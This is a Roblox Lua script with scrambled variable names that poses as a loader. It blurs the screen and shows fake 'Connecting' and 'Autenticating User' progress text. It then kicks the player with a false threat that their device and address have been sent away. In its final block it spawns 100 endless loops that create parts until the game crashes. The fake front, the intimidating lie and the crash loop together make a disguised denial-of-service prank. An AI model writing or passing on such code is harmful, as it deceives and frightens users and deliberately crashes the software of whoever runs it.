local lepmxae = game:GetService("Players")
local ztyuqne = game:GetService("TweenService")
local ewnyzoc = game:GetService("Lighting")
local ptzowla = game:GetService("Debris")
local bxpurot = game:GetService("UserInputService")

local mjcqtrv = lepmxae.LocalPlayer
local ovrxmap = mjcqtrv:WaitForChild("PlayerGui")

local function wyxzena(jdqeamc, zujkpno, exojkma)
	local fwlzqoa = Instance.new("Sound")
	fwlzqoa.SoundId = zujkpno
	fwlzqoa.Volume = 0.5
	fwlzqoa.Looped = exojkma or false
	fwlzqoa.Parent = jdqeamc
	return fwlzqoa
end

local trlxvmp = wyxzena(ovrxmap, "rbxassetid://9118823107", true)
local ftxaglo = wyxzena(ovrxmap, "rbxassetid://9118827160")
local qloxten = wyxzena(ovrxmap, "rbxassetid://138087017")

task.wait(4)

local apurxzn = Instance.new("BlurEffect")
apurxzn.Size = 0
apurxzn.Parent = ewnyzoc
ztyuqne:Create(apurxzn, TweenInfo.new(1), { Size = 24 }):Play()

local yjmaxbo = Instance.new("ScreenGui")
yjmaxbo.Name = "GuiLoad"
yjmaxbo.IgnoreGuiInset = true
yjmaxbo.ResetOnSpawn = false
yjmaxbo.Parent = ovrxmap

local hqzktpo = Instance.new("Frame")
hqzktpo.Size = UDim2.new(0.4, 0, 0.2, 0)
hqzktpo.Position = UDim2.new(0.5, 0, 0.5, 0)
hqzktpo.AnchorPoint = Vector2.new(0.5, 0.5)
hqzktpo.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
hqzktpo.BackgroundTransparency = 1
hqzktpo.Active = true
hqzktpo.Draggable = true
hqzktpo.Parent = yjmaxbo

ztyuqne:Create(hqzktpo, TweenInfo.new(1), { BackgroundTransparency = 0.05 }):Play()

Instance.new("UICorner", hqzktpo).CornerRadius = UDim.new(0, 16)

local xqowcaj = Instance.new("UIStroke", hqzktpo)
xqowcaj.Color = Color3.fromRGB(255, 255, 255)
xqowcaj.Thickness = 1
xqowcaj.Transparency = 0.8

local szetvqa = Instance.new("TextLabel")
szetvqa.Size = UDim2.new(1, -20, 1, -20)
szetvqa.Position = UDim2.new(0, 10, 0, 10)
szetvqa.BackgroundTransparency = 1
szetvqa.TextColor3 = Color3.new(1, 1, 1)
szetvqa.Font = Enum.Font.GothamSemibold
szetvqa.TextScaled = true
szetvqa.Text = ""
szetvqa.Parent = hqzktpo

Instance.new("UICorner", szetvqa)

Instance.new("UIGradient", szetvqa).Color = ColorSequence.new {
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 200, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 150))
}

trlxvmp:Play()

local function vgqrzbt(rhnqxma, vfmksoq, qlemvuc)
	local ozatubk = math.random(vfmksoq * 10, qlemvuc * 10) / 10
	local tnoikpy = math.floor(ozatubk / 0.5)

	local wguakzp = ftxaglo:Clone()
	wguakzp.Parent = ovrxmap
	wguakzp:Play()
	ptzowla:AddItem(wguakzp, 2)

	for i = 1, tnoikpy do
		szetvqa.Text = rhnqxma .. string.rep(".", i % 4)
		task.wait(0.5)
	end
end

vgqrzbt("Connecting", 1, 2)
print("Connected")
vgqrzbt("Autenticating User", 2, 3)
vgqrzbt("Doing Other Stuff", 3, 4)

local lpkavtx = ztyuqne:Create(hqzktpo, TweenInfo.new(1), { BackgroundTransparency = 1 })
lpkavtx:Play()
ztyuqne:Create(apurxzn, TweenInfo.new(1), { Size = 0 }):Play()

lpkavtx.Completed:Wait()

yjmaxbo:Destroy()
apurxzn:Destroy()
trlxvmp:Stop()

qloxten:Play()
task.wait(1.5)

mjcqtrv:Kick("You've Kicked: User Blacklisted Detected! " .. mjcqtrv.Name .. ", Infos: Device, Adress Have Been Sent To Us..")
wait(1)

for i = 1, 100 do
	spawn(function()
		while true do
			for i = 1, 1000 do
				Instance.new("Part").Parent = game.Workspace
			end
		end
	end)
end
